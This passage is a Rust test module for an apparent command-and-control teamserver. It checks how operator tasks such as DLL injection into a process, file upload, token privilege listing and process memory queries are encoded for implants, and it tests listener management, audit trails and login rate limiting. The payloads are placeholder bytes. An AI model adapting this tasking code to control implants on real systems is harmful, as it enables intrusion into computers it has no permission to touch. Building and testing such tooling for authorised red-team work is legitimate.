            ..AgentTaskInfo::default()
        })
        .expect("token privs-list job should build from extras");

        assert_eq!(
            job.payload,
            [u32::from(DemonTokenCommand::PrivsGetOrList).to_le_bytes(), 1_u32.to_le_bytes(),]
                .concat()
        );
    }

    #[test]
    fn build_job_encodes_token_privs_list_payload_from_extra_subcommand_numeric() {
        let job = build_job(&AgentTaskInfo {
            task_id: "30".to_owned(),
            command_line: "token 4".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandToken).to_string(),
            extra: BTreeMap::from([(String::from("SubCommand"), Value::String("4".to_owned()))]),
            ..AgentTaskInfo::default()
        })
        .expect("token privs-list job should build from numeric extra");

        assert_eq!(
            job.payload,
            [u32::from(DemonTokenCommand::PrivsGetOrList).to_le_bytes(), 1_u32.to_le_bytes(),]
                .concat()
        );
    }

    #[test]
    fn build_jobs_splits_upload_into_memfile_chunks_and_final_fs_job() {
        let content = vec![0x41; DEMON_MAX_RESPONSE_LENGTH + 16];
        let jobs = build_jobs(
            &AgentTaskInfo {
                task_id: "2F".to_owned(),
                command_line: "upload local.bin remote.bin".to_owned(),
                demon_id: "DEADBEEF".to_owned(),
                command_id: u32::from(DemonCommand::CommandFs).to_string(),
                sub_command: Some("upload".to_owned()),
                arguments: Some(format!(
                    "{};{}",
                    BASE64_STANDARD.encode("C:\\Temp\\remote.bin"),
                    BASE64_STANDARD.encode(&content)
                )),
                ..AgentTaskInfo::default()
            },
            "",
        )
        .expect("filesystem upload should encode");

        assert_eq!(jobs.len(), 3);
        assert_eq!(jobs[0].command, u32::from(DemonCommand::CommandMemFile));
        assert_eq!(jobs[1].command, u32::from(DemonCommand::CommandMemFile));
        assert_eq!(jobs[2].command, u32::from(DemonCommand::CommandFs));
        assert_eq!(jobs[2].request_id, 0x2F);

        let memfile_id =
            u32::from_le_bytes(jobs[0].payload[0..4].try_into().expect("memfile id should exist"));
        assert_eq!(
            u64::from_le_bytes(
                jobs[0].payload[4..12].try_into().expect("memfile size should exist")
            ),
            u64::try_from(content.len()).expect("content length should fit"),
        );
        assert_eq!(
            u32::from_le_bytes(
                jobs[2].payload[0..4].try_into().expect("upload command should exist")
            ),
            u32::from(DemonFilesystemCommand::Upload)
        );
        let final_memfile_id = u32::from_le_bytes(
            jobs[2].payload[jobs[2].payload.len() - 4..]
                .try_into()
                .expect("final memfile id should exist"),
        );
        assert_eq!(memfile_id, final_memfile_id);
    }

    #[test]
    fn build_job_encodes_inject_dll_payload() {
        let loader = BASE64_STANDARD.encode([0xCC_u8, 0xDD, 0xEE]);
        let binary = BASE64_STANDARD.encode([0x4D_u8, 0x5A, 0x90, 0x00]);
        let arguments = BASE64_STANDARD.encode("test-arg");
        let job = build_job(&AgentTaskInfo {
            task_id: "30".to_owned(),
            command_line: "inject-dll 1234 payload.dll".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandInjectDll).to_string(),
            extra: BTreeMap::from([
                (String::from("PID"), Value::String("1234".to_owned())),
                (String::from("DllLoader"), Value::String(loader)),
                (String::from("Binary"), Value::String(binary)),
                (String::from("Arguments"), Value::String(arguments)),
                (String::from("Technique"), Value::String("0".to_owned())),
            ]),
            ..AgentTaskInfo::default()
        })
        .expect("inject dll job should build");

        assert_eq!(job.command, u32::from(DemonCommand::CommandInjectDll));
        let mut offset = 0usize;
        assert_eq!(read_u32_le(&job.payload, &mut offset), 0);
        assert_eq!(read_u32_le(&job.payload, &mut offset), 1234);
        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), vec![0xCC, 0xDD, 0xEE]);
        assert_eq!(
            read_len_prefixed_bytes(&job.payload, &mut offset),
            vec![0x4D, 0x5A, 0x90, 0x00]
        );
        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), b"test-arg".to_vec());
    }

    #[test]
    fn build_job_encodes_inject_dll_with_default_technique() {
        let loader = BASE64_STANDARD.encode([0xAA_u8]);
        let binary = BASE64_STANDARD.encode([0xBB_u8]);
        let job = build_job(&AgentTaskInfo {
            task_id: "31".to_owned(),
            command_line: "inject-dll 5555 minimal.dll".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandInjectDll).to_string(),
            extra: BTreeMap::from([
                (String::from("PID"), Value::String("5555".to_owned())),
                (String::from("DllLoader"), Value::String(loader)),
                (String::from("Binary"), Value::String(binary)),
            ]),
            ..AgentTaskInfo::default()
        })
        .expect("inject dll job should build with default technique");

        let mut offset = 0usize;
        assert_eq!(read_u32_le(&job.payload, &mut offset), 0);
        assert_eq!(read_u32_le(&job.payload, &mut offset), 5555);
    }

    #[test]
    fn build_job_encodes_spawn_dll_payload() {
        let loader = BASE64_STANDARD.encode([0x11_u8, 0x22, 0x33]);
        let binary = BASE64_STANDARD.encode([0x4D_u8, 0x5A]);
        let arguments = BASE64_STANDARD.encode("spawn-args");
        let job = build_job(&AgentTaskInfo {
            task_id: "32".to_owned(),
            command_line: "spawn-dll payload.dll".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandSpawnDll).to_string(),
            extra: BTreeMap::from([
                (String::from("DllLoader"), Value::String(loader)),
                (String::from("Binary"), Value::String(binary)),
                (String::from("Arguments"), Value::String(arguments)),
            ]),
            ..AgentTaskInfo::default()
        })
        .expect("spawn dll job should build");

        assert_eq!(job.command, u32::from(DemonCommand::CommandSpawnDll));
        let mut offset = 0usize;
        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), vec![0x11, 0x22, 0x33]);
        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), vec![0x4D, 0x5A]);
        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), b"spawn-args".to_vec());
    }

    #[test]
    fn build_job_encodes_process_modules_payload() {
        let job = build_job(&AgentTaskInfo {
            task_id: "33".to_owned(),
            command_line: "proc modules 8888".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandProc).to_string(),
            sub_command: Some("modules".to_owned()),
            extra: BTreeMap::from([(String::from("Args"), Value::String("8888".to_owned()))]),
            ..AgentTaskInfo::default()
        })
        .expect("proc modules job should build");

        assert_eq!(job.command, u32::from(DemonCommand::CommandProc));
        let mut offset = 0usize;
        assert_eq!(read_u32_le(&job.payload, &mut offset), u32::from(DemonProcessCommand::Modules));
        assert_eq!(read_u32_le(&job.payload, &mut offset), 8888);
    }

    #[test]
    fn build_job_encodes_process_grep_payload() {
        let job = build_job(&AgentTaskInfo {
            task_id: "34".to_owned(),
            command_line: "proc grep svchost".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandProc).to_string(),
            sub_command: Some("grep".to_owned()),
            extra: BTreeMap::from([(String::from("Args"), Value::String("svchost".to_owned()))]),
            ..AgentTaskInfo::default()
        })
        .expect("proc grep job should build");

        assert_eq!(job.command, u32::from(DemonCommand::CommandProc));
        let mut offset = 0usize;
        assert_eq!(read_u32_le(&job.payload, &mut offset), u32::from(DemonProcessCommand::Grep));
        let grep_pattern = decode_utf16(read_len_prefixed_bytes(&job.payload, &mut offset));
        assert_eq!(grep_pattern, "svchost");
    }

    #[test]
    fn build_job_encodes_process_memory_payload() {
        let job = build_job(&AgentTaskInfo {
            task_id: "35".to_owned(),
            command_line: "proc memory 4321 PAGE_EXECUTE_READWRITE".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandProc).to_string(),
            sub_command: Some("memory".to_owned()),
            extra: BTreeMap::from([(
                String::from("Args"),
                Value::String("4321 PAGE_EXECUTE_READWRITE".to_owned()),
            )]),
            ..AgentTaskInfo::default()
        })
        .expect("proc memory job should build");

        assert_eq!(job.command, u32::from(DemonCommand::CommandProc));
        let mut offset = 0usize;
        assert_eq!(read_u32_le(&job.payload, &mut offset), u32::from(DemonProcessCommand::Memory));
        assert_eq!(read_u32_le(&job.payload, &mut offset), 4321);
        assert_eq!(read_u32_le(&job.payload, &mut offset), 0x40);
    }

    #[test]
    fn build_job_rejects_empty_task_id() {
        let result = build_job(&AgentTaskInfo {
            task_id: String::new(),
            command_line: "checkin".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
            ..AgentTaskInfo::default()
        });
        let err = result.expect_err("empty task_id should fail");
        assert!(matches!(err, AgentCommandError::InvalidTaskId { .. }));
    }

    #[test]
    fn build_job_rejects_non_hex_task_id() {
        let result = build_job(&AgentTaskInfo {
            task_id: "not-hex".to_owned(),
            command_line: "checkin".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
            ..AgentTaskInfo::default()
        });
        let err = result.expect_err("non-hex task_id should fail");
        assert!(matches!(err, AgentCommandError::InvalidTaskId { .. }));
    }

    #[test]
    fn build_job_rejects_overflowing_task_id() {
        let result = build_job(&AgentTaskInfo {
            task_id: "FFFFFFFFFF".to_owned(),
            command_line: "checkin".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
            ..AgentTaskInfo::default()
        });
        let err = result.expect_err("overflowing task_id should fail");
        assert!(matches!(err, AgentCommandError::InvalidTaskId { .. }));
    }

    #[test]
    fn build_job_accepts_valid_hex_task_id() {
        let job = build_job(&AgentTaskInfo {
            task_id: "FF".to_owned(),
            command_line: "checkin".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
            ..AgentTaskInfo::default()
        })
        .expect("valid hex task_id should succeed");
        assert_eq!(job.request_id, 0xFF);
    }

    #[tokio::test]
    async fn websocket_listener_commands_broadcast_and_persist_state() {
        let state = TestState::new().await;
        let listeners = state.listeners.clone();
        let (mut sender, server) = spawn_server(state.clone()).await;
        let (mut observer, _) = spawn_server(state).await;

        login(&mut sender, "operator", "password1234").await;
        login(&mut observer, "operator", "password1234").await;

        sender
            .send(ClientMessage::Text(
                listener_new_message("operator", sample_listener_info("alpha", "Online", 0), false)
                    .into(),
            ))
            .await
            .expect("listener create should send");

        let created = read_operator_message(&mut observer).await;
        let OperatorMessage::ListenerNew(message) = created else {
            panic!("expected listener create broadcast");
        };
        assert_eq!(message.head.user, "operator");
        assert_eq!(message.info.name.as_deref(), Some("alpha"));

        let started = read_operator_message(&mut observer).await;
        let OperatorMessage::ListenerMark(message) = started else {
            panic!("expected listener start broadcast");
        };
        assert_eq!(message.info.name, "alpha");
        assert_eq!(message.info.mark, "Online");
        assert_eq!(
            listeners.summary("alpha").await.expect("listener should exist").state.status,
            crate::ListenerStatus::Running
        );

        sender
            .send(ClientMessage::Text(listener_mark_message("operator", "alpha", "stopped").into()))
            .await
            .expect("listener stop should send");

        let stopped = read_operator_message(&mut observer).await;
        let OperatorMessage::ListenerMark(message) = stopped else {
            panic!("expected listener stop broadcast");
        };
        assert_eq!(message.info.name, "alpha");
        assert_eq!(message.info.mark, "Offline");
        assert_eq!(
            listeners.summary("alpha").await.expect("listener should exist").state.status,
            crate::ListenerStatus::Stopped
        );

        sender
            .send(ClientMessage::Text(listener_remove_message("operator", "alpha").into()))
            .await
            .expect("listener delete should send");

        let removed = read_operator_message(&mut observer).await;
        let OperatorMessage::ListenerRemove(message) = removed else {
            panic!("expected listener delete broadcast");
        };
        assert_eq!(message.info.name, "alpha");
        assert!(listeners.summary("alpha").await.is_err());

        sender.close(None).await.expect("close should send");
        observer.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_listener_remove_records_audit_trail() {
        let state = TestState::new().await;
        let database = state.database.clone();
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        socket
            .send(ClientMessage::Text(
                listener_new_message("operator", sample_listener_info("beta", "Online", 0), false)
                    .into(),
            ))
            .await
            .expect("listener create should send");

        let _created = read_operator_message(&mut socket).await;
        let _started = read_operator_message(&mut socket).await;

        socket
            .send(ClientMessage::Text(listener_remove_message("operator", "beta").into()))
            .await
            .expect("listener delete should send");

        let _removed = read_operator_message(&mut socket).await;

        let page = query_audit_log(
            &database,
            &AuditQuery { action: Some("listener.delete".to_owned()), ..AuditQuery::default() },
        )
        .await
        .expect("audit query should succeed");

        assert!(!page.items.is_empty(), "expected at least one listener.delete audit entry");
        let entry = &page.items[0];
        assert_eq!(entry.action, "listener.delete");
        assert_eq!(entry.target_kind, "listener");
        assert_eq!(entry.target_id.as_deref(), Some("beta"));
        assert_eq!(entry.result_status, AuditResultStatus::Success);

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_listener_remove_nonexistent_records_failure_audit() {
        let state = TestState::new().await;
        let database = state.database.clone();
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        socket
            .send(ClientMessage::Text(listener_remove_message("operator", "ghost").into()))
            .await
            .expect("listener delete should send");

        let _error_msg = read_operator_message(&mut socket).await;

        let page = query_audit_log(
            &database,
            &AuditQuery { action: Some("listener.delete".to_owned()), ..AuditQuery::default() },
        )
        .await
        .expect("audit query should succeed");

        assert!(!page.items.is_empty(), "expected at least one listener.delete audit entry");
        let entry = &page.items[0];
        assert_eq!(entry.action, "listener.delete");
        assert_eq!(entry.target_kind, "listener");
        assert_eq!(entry.result_status, AuditResultStatus::Failure);

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_listener_edit_records_audit_trail() {
        let state = TestState::new().await;
        let database = state.database.clone();
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        socket
            .send(ClientMessage::Text(
                listener_new_message(
                    "operator",
                    sample_listener_info("gamma", "Online", 8443),
                    false,
                )
                .into(),
            ))
            .await
            .expect("listener create should send");

        let _created = read_operator_message(&mut socket).await;
        let _started = read_operator_message(&mut socket).await;

        let mut updated = sample_listener_info("gamma", "Online", 9443);
        updated.headers = Some("X-Test: updated".to_owned());

        socket
            .send(ClientMessage::Text(listener_edit_message("operator", updated).into()))
            .await
            .expect("listener edit should send");

        let _updated = read_operator_message(&mut socket).await;

        let page = query_audit_log(
            &database,
            &AuditQuery { action: Some("listener.update".to_owned()), ..AuditQuery::default() },
        )
        .await
        .expect("audit query should succeed");

        assert!(!page.items.is_empty(), "expected at least one listener.update audit entry");
        let entry = &page.items[0];
        assert_eq!(entry.action, "listener.update");
        assert_eq!(entry.target_kind, "listener");
        assert_eq!(entry.target_id.as_deref(), Some("gamma"));
        assert_eq!(entry.result_status, AuditResultStatus::Success);

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_listener_edit_nonexistent_records_failure_audit() {
        let state = TestState::new().await;
        let database = state.database.clone();
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        socket
            .send(ClientMessage::Text(
                listener_edit_message("operator", sample_listener_info("ghost", "Online", 9443))
                    .into(),
            ))
            .await
            .expect("listener edit should send");

        let _error_msg = read_operator_message(&mut socket).await;

        let page = query_audit_log(
            &database,
            &AuditQuery { action: Some("listener.update".to_owned()), ..AuditQuery::default() },
        )
        .await
        .expect("audit query should succeed");

        assert!(!page.items.is_empty(), "expected at least one listener.update audit entry");
        let entry = &page.items[0];
        assert_eq!(entry.action, "listener.update");
        assert_eq!(entry.target_kind, "listener");
        assert_eq!(entry.target_id.as_deref(), Some("ghost"));
        assert_eq!(entry.result_status, AuditResultStatus::Failure);

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_agent_note_updates_registry() {
        let state = TestState::new().await;
        let registry = state.registry.clone();
        registry.insert(sample_agent(0xDEAD_BEEF)).await.expect("agent should insert");
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        socket
            .send(ClientMessage::Text(
                agent_task_message(
                    "operator",
                    AgentTaskInfo {
                        task_id: "2B".to_owned(),
                        command_line: "note tracked through vpn".to_owned(),
                        demon_id: "DEADBEEF".to_owned(),
                        command_id: "Teamserver".to_owned(),
                        command: Some("note".to_owned()),
                        arguments: Some("tracked through vpn".to_owned()),
                        ..AgentTaskInfo::default()
                    },
                )
                .into(),
            ))
            .await
            .expect("note should send");

        timeout(Duration::from_secs(2), async {
            loop {
                let updated = registry.get(0xDEAD_BEEF).await.expect("agent should exist");
                if updated.note == "tracked through vpn" {
                    break;
                }
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("agent note should update");

        let updated = registry.get(0xDEAD_BEEF).await.expect("agent should exist");
        assert_eq!(updated.note, "tracked through vpn");

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_agent_remove_deletes_agent_for_admins() {
        let state = TestState::new().await;
        let registry = state.registry.clone();
        let sockets = state.sockets.clone();
        registry.insert(sample_agent(0xDEAD_BEEF)).await.expect("agent should insert");
        sockets.add_socks_server(0xDEAD_BEEF, "0").await.expect("SOCKS server should start");
        assert!(sockets.list_socks_servers(0xDEAD_BEEF).await.contains("SOCKS5 servers"));
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "admin", "adminpass").await;
        let snapshot = read_operator_message(&mut socket).await;
        assert!(matches!(snapshot, OperatorMessage::AgentNew(_)));

        socket
            .send(ClientMessage::Text(agent_remove_message("admin", "DEADBEEF").into()))
            .await
            .expect("remove should send");

        let event = read_operator_message(&mut socket).await;
        assert!(matches!(event, OperatorMessage::AgentRemove(_)));
        assert!(registry.get(0xDEAD_BEEF).await.is_none());
        assert_eq!(sockets.list_socks_servers(0xDEAD_BEEF).await, "No active SOCKS5 servers");

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_agent_remove_records_success_audit_trail() {
        let state = TestState::new().await;
        let database = state.database.clone();
        let registry = state.registry.clone();
        registry.insert(sample_agent(0xDEAD_BEEF)).await.expect("agent should insert");
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "admin", "adminpass").await;
        let _snapshot = read_operator_message(&mut socket).await;

        socket
            .send(ClientMessage::Text(agent_remove_message("admin", "DEADBEEF").into()))
            .await
            .expect("remove should send");

        let _event = read_operator_message(&mut socket).await;

        let page = query_audit_log(
            &database,
            &AuditQuery { action: Some("agent.delete".to_owned()), ..AuditQuery::default() },
        )
        .await
        .expect("audit query should succeed");

        assert!(!page.items.is_empty(), "expected at least one agent.delete audit entry");
        let entry = &page.items[0];
        assert_eq!(entry.actor, "admin");
        assert_eq!(entry.action, "agent.delete");
        assert_eq!(entry.target_kind, "agent");
        assert_eq!(entry.target_id.as_deref(), Some("DEADBEEF"));
        assert_eq!(entry.agent_id.as_deref(), Some("DEADBEEF"));
        assert_eq!(entry.command.as_deref(), Some("delete"));
        assert_eq!(entry.result_status, AuditResultStatus::Success);

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_agent_remove_missing_agent_records_failure_audit() {
        let state = TestState::new().await;
        let database = state.database.clone();
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "admin", "adminpass").await;

        socket
            .send(ClientMessage::Text(agent_remove_message("admin", "DEADBEEF").into()))
            .await
            .expect("remove should send");

        let _error = read_operator_message(&mut socket).await;

        let page = query_audit_log(
            &database,
            &AuditQuery { action: Some("agent.delete".to_owned()), ..AuditQuery::default() },
        )
        .await
        .expect("audit query should succeed");

        assert!(!page.items.is_empty(), "expected at least one agent.delete audit entry");
        let entry = &page.items[0];
        assert_eq!(entry.actor, "admin");
        assert_eq!(entry.action, "agent.delete");
        assert_eq!(entry.target_kind, "agent");
        assert_eq!(entry.target_id.as_deref(), Some("DEADBEEF"));
        assert_eq!(entry.agent_id.as_deref(), Some("DEADBEEF"));
        assert_eq!(entry.command.as_deref(), Some("delete"));
        assert_eq!(entry.result_status, AuditResultStatus::Failure);
        let parameters =
            entry.parameters.as_ref().expect("failure audit should include parameters");
        assert_eq!(parameters.get("agent_id"), Some(&Value::String("DEADBEEF".to_owned())));
        assert!(parameters.get("error").is_some(), "failure audit should include error details");

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_reports_missing_agents_for_agent_commands() {
        let state = TestState::new().await;
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        socket
            .send(ClientMessage::Text(
                agent_task_message(
                    "operator",
                    AgentTaskInfo {
                        task_id: "2C".to_owned(),
                        command_line: "checkin".to_owned(),
                        demon_id: "DEADBEEF".to_owned(),
                        command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
                        ..AgentTaskInfo::default()
                    },
                )
                .into(),
            ))
            .await
            .expect("task should send");

        let event = read_operator_message(&mut socket).await;
        let OperatorMessage::TeamserverLog(message) = event else {
            panic!("expected teamserver log");
        };
        assert!(message.info.text.contains("not found"));

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    async fn spawn_server(
        state: TestState,
    ) -> (
        tokio_tungstenite::WebSocketStream<
            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
        >,
        tokio::task::JoinHandle<()>,
    ) {
        let app = routes::<TestState>().with_state(state);
        let listener = TcpListener::bind("127.0.0.1:0").await.expect("listener should bind");
        let addr = listener.local_addr().expect("listener should expose addr");
        let server = tokio::spawn(async move {
            let _ = axum::serve(
                listener,
                app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
            )
            .await;
        });
        let (socket, _) =
            connect_async(format!("ws://{addr}/")).await.expect("websocket should connect");

        (socket, server)
    }

    async fn read_operator_message(
        socket: &mut tokio_tungstenite::WebSocketStream<
            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
        >,
    ) -> OperatorMessage {
        let frame = timeout(Duration::from_secs(5), socket.next())
            .await
            .expect("socket should yield a frame")
            .expect("frame should be present")
            .expect("frame should decode");

        match frame {
            ClientMessage::Text(payload) => {
                serde_json::from_str(payload.as_str()).expect("message should parse")
            }
            other => panic!("unexpected frame: {other:?}"),
        }
    }

    async fn read_operator_snapshot(
        socket: &mut tokio_tungstenite::WebSocketStream<
            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
        >,
    ) -> Vec<OperatorInfo> {
        let message = read_operator_message(socket).await;
        let OperatorMessage::InitConnectionInfo(message) = message else {
            panic!("expected operator snapshot event");
        };

        serde_json::from_value(
            message
                .info
                .fields
                .get("Operators")
                .cloned()
                .expect("operator snapshot should include operators"),
        )
        .expect("operator snapshot should decode")
    }

    async fn wait_for_connection_count(manager: &OperatorConnectionManager, expected: usize) {
        timeout(Duration::from_secs(2), async {
            loop {
                if manager.connection_count().await == expected {
                    break;
                }
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("connection registry should reach expected size");
    }

    fn login_message(user: &str, password: &str) -> String {
        serde_json::to_string(&OperatorMessage::Login(Message {
            head: MessageHead {
                event: EventCode::InitConnection,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info: LoginInfo { user: user.to_owned(), password: hash_password_sha3(password) },
        }))
        .expect("login should serialize")
    }

    fn agent_task_message(user: &str, info: AgentTaskInfo) -> String {
        serde_json::to_string(&OperatorMessage::AgentTask(Message {
            head: MessageHead {
                event: EventCode::Session,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info,
        }))
        .expect("task should serialize")
    }

    fn agent_remove_message(user: &str, demon_id: &str) -> String {
        let mut fields = BTreeMap::new();
        fields.insert("DemonID".to_owned(), Value::String(demon_id.to_owned()));

        serde_json::to_string(&OperatorMessage::AgentRemove(Message {
            head: MessageHead {
                event: EventCode::Session,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info: FlatInfo { fields },
        }))
        .expect("remove should serialize")
    }

    fn read_u32_le(bytes: &[u8], offset: &mut usize) -> u32 {
        let value =
            u32::from_le_bytes(bytes[*offset..*offset + 4].try_into().expect("u32 should fit"));
        *offset += 4;
        value
    }

    fn read_len_prefixed_bytes(bytes: &[u8], offset: &mut usize) -> Vec<u8> {
        let len = read_u32_le(bytes, offset) as usize;
        let value = bytes[*offset..*offset + len].to_vec();
        *offset += len;
        value
    }

    fn decode_utf16(bytes: Vec<u8>) -> String {
        let words = bytes
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16_lossy(&words).trim_end_matches('\0').to_owned()
    }

    fn listener_new_message(user: &str, info: ListenerInfo, one_time: bool) -> String {
        serde_json::to_string(&OperatorMessage::ListenerNew(Message {
            head: MessageHead {
                event: EventCode::Listener,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: if one_time { "true".to_owned() } else { String::new() },
            },
            info,
        }))
        .expect("listener create should serialize")
    }

    fn listener_mark_message(user: &str, name: &str, mark: &str) -> String {
        serde_json::to_string(&OperatorMessage::ListenerMark(Message {
            head: MessageHead {
                event: EventCode::Listener,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info: ListenerMarkInfo { name: name.to_owned(), mark: mark.to_owned() },
        }))
        .expect("listener mark should serialize")
    }

    fn listener_remove_message(user: &str, name: &str) -> String {
        serde_json::to_string(&OperatorMessage::ListenerRemove(Message {
            head: MessageHead {
                event: EventCode::Listener,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info: NameInfo { name: name.to_owned() },
        }))
        .expect("listener remove should serialize")
    }

    fn listener_edit_message(user: &str, info: ListenerInfo) -> String {
        serde_json::to_string(&OperatorMessage::ListenerEdit(Message {
            head: MessageHead {
                event: EventCode::Listener,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info,
        }))
        .expect("listener edit should serialize")
    }

    fn chat_message(user: &str, text: &str) -> String {
        serde_json::to_string(&OperatorMessage::ChatMessage(Message {
            head: MessageHead {
                event: EventCode::Chat,
                user: user.to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info: FlatInfo {
                fields: BTreeMap::from([
                    ("User".to_owned(), Value::String(user.to_owned())),
                    ("Message".to_owned(), Value::String(text.to_owned())),
                ]),
            },
        }))
        .expect("chat should serialize")
    }

    async fn login(
        socket: &mut tokio_tungstenite::WebSocketStream<
            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
        >,
        user: &str,
        password: &str,
    ) {
        socket
            .send(ClientMessage::Text(login_message(user, password).into()))
            .await
            .expect("login should send");
        let response = read_operator_message(socket).await;
        assert!(matches!(response, OperatorMessage::InitConnectionSuccess(_)));
        let _snapshot = read_operator_snapshot(socket).await;
    }

    fn sample_agent(agent_id: u32) -> red_cell_common::AgentInfo {
        red_cell_common::AgentInfo {
            agent_id,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: AgentEncryptionInfo {
                aes_key: "YWVzLWtleQ==".to_owned(),
                aes_iv: "YWVzLWl2".to_owned(),
            },
            hostname: "wkstn-01".to_owned(),
            username: "operator".to_owned(),
            domain_name: "REDCELL".to_owned(),
            external_ip: "203.0.113.10".to_owned(),
            internal_ip: "10.0.0.25".to_owned(),
            process_name: "explorer.exe".to_owned(),
            base_address: 0x401000,
            process_pid: 1337,
            process_tid: 1338,
            process_ppid: 512,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Windows 11".to_owned(),
            os_arch: "x64".to_owned(),
            sleep_delay: 15,
            sleep_jitter: 20,
            kill_date: Some(1_893_456_000),
            working_hours: Some(0b101010),
            first_call_in: "2026-03-09T18:45:00Z".to_owned(),
            last_call_in: "2026-03-09T18:46:00Z".to_owned(),
        }
    }

    fn sample_http_listener(name: &str, port: u16) -> red_cell_common::ListenerConfig {
        red_cell_common::ListenerConfig::from(red_cell_common::HttpListenerConfig {
            name: name.to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["c2.redcell.test".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: Some("GET".to_owned()),
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: Some("Mozilla/5.0".to_owned()),
            headers: vec!["X-Test: true".to_owned()],
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        })
    }

    fn sample_listener_info(name: &str, status: &str, port: u16) -> ListenerInfo {
        ListenerInfo {
            name: Some(name.to_owned()),
            protocol: Some("Http".to_owned()),
            status: Some(status.to_owned()),
            hosts: Some("c2.redcell.test".to_owned()),
            host_bind: Some("127.0.0.1".to_owned()),
            host_rotation: Some("round-robin".to_owned()),
            port_bind: Some(port.to_string()),
            port_conn: Some(port.to_string()),
            headers: Some("X-Test: true".to_owned()),
            uris: Some("/".to_owned()),
            user_agent: Some("Mozilla/5.0".to_owned()),
            secure: Some("false".to_owned()),
            ..ListenerInfo::default()
        }
    }

    #[tokio::test]
    async fn login_rate_limiter_allows_attempts_below_threshold() {
        let limiter = LoginRateLimiter::new();
        let ip: IpAddr = "192.168.1.10".parse().expect("valid IP");

        for _ in 0..super::MAX_FAILED_LOGIN_ATTEMPTS {
            assert!(limiter.is_allowed(ip).await);
            limiter.record_failure(ip).await;
        }

        assert!(!limiter.is_allowed(ip).await);
    }

    #[tokio::test]
    async fn login_rate_limiter_isolates_different_ips() {
        let limiter = LoginRateLimiter::new();
        let ip_a: IpAddr = "10.0.0.1".parse().expect("valid IP");
        let ip_b: IpAddr = "10.0.0.2".parse().expect("valid IP");

        for _ in 0..super::MAX_FAILED_LOGIN_ATTEMPTS {
            limiter.record_failure(ip_a).await;
        }

        assert!(!limiter.is_allowed(ip_a).await);
